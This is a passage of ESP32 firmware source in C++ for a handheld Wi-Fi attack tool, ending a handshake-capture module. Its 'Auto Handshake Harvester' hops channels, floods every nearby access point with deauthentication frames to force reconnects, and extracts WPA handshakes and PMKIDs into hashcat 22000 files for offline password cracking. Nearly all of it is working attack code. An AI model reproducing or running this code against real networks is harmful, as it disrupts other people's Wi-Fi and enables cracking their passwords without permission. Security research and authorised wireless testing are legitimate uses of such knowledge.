        write22000();                                   // export hashcat 22000 before closing
        crackableEAPOL = haveAnonce && haveM2full;
        crackablePMKID = havePmkid;
        hsStop(); state = HS_DONE; drawDone(); break;
      }
      // exit is handled by the menu (BTN_SELECT), which calls HandshakeCapture::exit()
      delay(120);
      break;
    }

    case HS_DONE:
    case HS_ERR: {
      // nothing to do; BTN_SELECT (handled by menu) returns to the submenu
      delay(80);
      break;
    }

    default: break;
  }
}

// ═══════════════════════ AUTO HANDSHAKE HARVESTER ═══════════════════════
// Channel-hops and captures EAPOL/PMKID from EVERY AP in range to one pcap+22000.
struct Cap {
  uint8_t bssid[6]; char ssid[20]; uint8_t ch;
  bool m1,m2,m3,m4, havePmkid, haveAnonce, haveM2, done, logged;
  uint8_t pmkid[16], anonce[32], mic[16], m2eapol[200]; int m2len;
};
static Cap caps[12];
static int  capN = 0;
static uint8_t curCh = 1;
static uint32_t chHopMs = 0, apDeauthMs = 0;
static int harvestCount = 0;
static String harvest22000;

static Cap* findCap(const uint8_t* bssid) {
  for (int i = 0; i < capN; i++) if (!memcmp(caps[i].bssid, bssid, 6)) return &caps[i];
  if (capN >= (int)(sizeof(caps)/sizeof(caps[0]))) return nullptr;
  Cap* c = &caps[capN++];
  memset(c, 0, sizeof(Cap));
  memcpy(c->bssid, bssid, 6); strcpy(c->ssid, "<hidden>"); c->ch = curCh;
  return c;
}

// append one AP's hashcat 22000 line(s)
static void writeApLine(Cap* c) {
  if (!(c->havePmkid || (c->haveAnonce && c->haveM2))) return;
  File f = sdOpenWrite(harvest22000.c_str());
  if (!f) return;
  f.seek(f.size());
  char apx[13], stax[13], esx[66], buf[800];
  toHex(c->bssid, 6, apx); toHex(c->bssid, 6, stax);   // STA unknown here -> reuse AP (hashcat ok)
  toHex((const uint8_t*)c->ssid, strlen(c->ssid), esx);
  if (c->havePmkid) { char pmx[33]; toHex(c->pmkid,16,pmx);
    snprintf(buf,sizeof(buf),"WPA*01*%s*%s*%s*%s***\n",pmx,apx,stax,esx); f.print(buf); }
  if (c->haveAnonce && c->haveM2) {
    uint8_t cp[200]; memcpy(cp,c->m2eapol,c->m2len); if (c->m2len>=97) memset(cp+81,0,16);
    char micx[33],anx[65],eapx[420]; toHex(c->mic,16,micx); toHex(c->anonce,32,anx); toHex(cp,c->m2len,eapx);
    snprintf(buf,sizeof(buf),"WPA*02*%s*%s*%s*%s*%s*%s*00\n",micx,apx,stax,esx,anx,eapx); f.print(buf);
  }
  f.flush(); f.close();
}

static void harvestExtract(const uint8_t* p, int len) {
  const uint8_t fc = p[0];
  const uint8_t* bssid = p + 16;              // addr3
  if (fc == 0x80) {                           // beacon -> learn SSID
    Cap* c = findCap(bssid); if (!c) return;
    int o = 36;                               // 24 hdr + 12 fixed params
    if (o + 2 <= len && p[o] == 0x00) {       // SSID tag
      int sl = p[o+1]; if (sl > 19) sl = 19;
      if (o + 2 + sl <= len && sl > 0) { memcpy(c->ssid, p+o+2, sl); c->ssid[sl]=0; }
    }
    return;
  }
  int eo = findEapol(p, len); if (eo < 0) return;
  const uint8_t* e = p + eo; int avail = len - eo; if (avail < 99) return;
  Cap* c = findCap(bssid); if (!c) return;
  int m = eapolMsg(e, avail);
  if (m==1) { c->m1=true; memcpy(c->anonce,e+17,32); c->haveAnonce=true;
    uint16_t kd=((uint16_t)e[97]<<8)|e[98];
    if (kd>=20 && 99+kd<=avail){ const uint8_t* k=e+99;
      for(int i=0;i+20<=kd;i++) if(k[i]==0&&k[i+1]==0x0F&&k[i+2]==0xAC&&k[i+3]==0x04){ memcpy(c->pmkid,k+i+4,16); if(nonZero(c->pmkid,16)) c->havePmkid=true; break; } }
  } else if (m==2) { c->m2=true; memcpy(c->mic,e+81,16);
    int el=4+(((int)e[2]<<8)|e[3]); if(el>=99 && el<=(int)sizeof(c->m2eapol) && eo+el<=len){ memcpy(c->m2eapol,e,el); c->m2len=el; c->haveM2=true; } }
  else if (m==3) c->m3=true; else if (m==4) c->m4=true;
}

static void startSniffHarvest() {
  if (!pool)   pool   = (Slot*)malloc(sizeof(Slot) * HS_QLEN);
  if (!freeQ)  freeQ  = xQueueCreate(HS_QLEN, sizeof(uint8_t));
  if (!writeQ) writeQ = xQueueCreate(HS_QLEN, sizeof(uint8_t));
  if (pool && freeQ) { for (uint8_t i = 0; i < HS_QLEN; i++) xQueueSend(freeQ, &i, 0); }
  WiFi.mode(WIFI_STA); WiFi.disconnect(); delay(50);
  WiFi.setTxPower(WIFI_POWER_19_5dBm);
  esp_wifi_set_promiscuous(false);
  wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
  esp_wifi_set_promiscuous_filter(&filt);
  esp_wifi_set_promiscuous_rx_cb(&sniffer);
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);
}

static void startAuto() {
  capN = harvestCount = 0; curCh = 1; eapolCount = droppedCount = 0;
  chHopMs = apDeauthMs = 0;
  // one capture file for the whole run
  strncpy(target.ssid, "harvest", sizeof(target.ssid)); memset(target.bssid, 0, 6); target.ch = 1;
  hsLogging = openPcap();
  if (!hsLogging) {
    state = HS_ERR; header("SD error"); hsFont(); tft.setTextColor(C_RED,C_BG);
    tft.setCursor(6, HS_HEADER_Y+22); tft.print("No SD / open failed");
    hsNav(nullptr,nullptr,"Back",nullptr,nullptr); return;
  }
  harvest22000 = hsPath; harvest22000.replace(".pcap", ".22000");
  harvestMode = true;
  startSniffHarvest();
  header("Auto Harvest", false, C_GRN);
  hsNav(nullptr, nullptr, "Stop", nullptr, nullptr);
  hsLogClear();
  hsLog("[*] auto harvest started", C_ORA);
  hsLog("[*] hopping channels, deauth on", C_GRY);
  hsLog("[*] saving all APs to SD...");
  state = HS_AUTO;
}

static void harvestTick() {
  if (!harvestMode) { delay(80); return; }   // setup failed (e.g. SD) -> idle until exit
  // drain: write to pcap + extract per-AP
  if (writeQ && freeQ && pool) {
    uint8_t idx; int drained = 0;
    while (drained < 8 && xQueueReceive(writeQ, &idx, 0) == pdTRUE) {
      writeRecord(pool[idx]); harvestExtract(pool[idx].data, pool[idx].len);
      xQueueSend(freeQ, &idx, 0); drained++;
    }
    if (drained) hsFile.flush();
  }
  // report finished APs
  for (int i = 0; i < capN; i++) {
    Cap* c = &caps[i];
    if (!c->done && ((c->m2 && (c->m1 || c->m3)) || c->havePmkid)) {
      c->done = true;
      if (!c->logged) {
        c->logged = true; harvestCount++;
        writeApLine(c);
        char l[48]; snprintf(l, sizeof(l), "[+] %.16s  %s", c->ssid, c->havePmkid ? "PMKID" : "M1+M2");
        hsLog(l, C_GRN);
      }
    }
  }
  uint32_t now = millis();
  // deauth APs seen on the current channel to force reconnects
  if (now - apDeauthMs > 1200) {
    apDeauthMs = now;
    for (int i = 0; i < capN; i++) if (caps[i].ch == curCh && !caps[i].done) {
      memcpy(&deauthFrame[10], caps[i].bssid, 6); memcpy(&deauthFrame[16], caps[i].bssid, 6);
      for (uint8_t k = 0; k < 3; k++) { esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false); delay(2); }
    }
  }
  // hop channel every 2.5 s
  if (now - chHopMs > 2500) {
    chHopMs = now;
    curCh = (curCh % 13) + 1;
    esp_wifi_set_channel(curCh, WIFI_SECOND_CHAN_NONE);
    char l[40]; snprintf(l, sizeof(l), "[*] ch%d  APs:%d  caught:%d", curCh, capN, harvestCount);
    hsLog(l, C_GRY);
  }
  delay(60);
}

void exit() { harvestMode = false; hsStop(); }

} // namespace HandshakeCapture
